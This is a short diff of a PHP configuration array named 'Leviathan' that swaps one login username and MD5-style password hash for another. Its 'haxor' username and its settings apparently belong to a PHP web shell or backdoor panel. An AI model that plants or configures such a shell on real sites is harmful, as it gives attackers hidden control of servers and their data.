@@ -1,8 +1,8 @@
 <?php
 
 $GLOBALS['Leviathan'] = array(
-    'username' => 'haxor',
-    'password' => '7d793037a0760186574b0282f2f435e7',
+    'username' => 'pablophantom',
+    'password' => '8a16a3a508d0e43e87554388eaabf3e3',
     'safe_mode' => '0',
     'login_page' => 'gui',
     'show_icons' => '1',
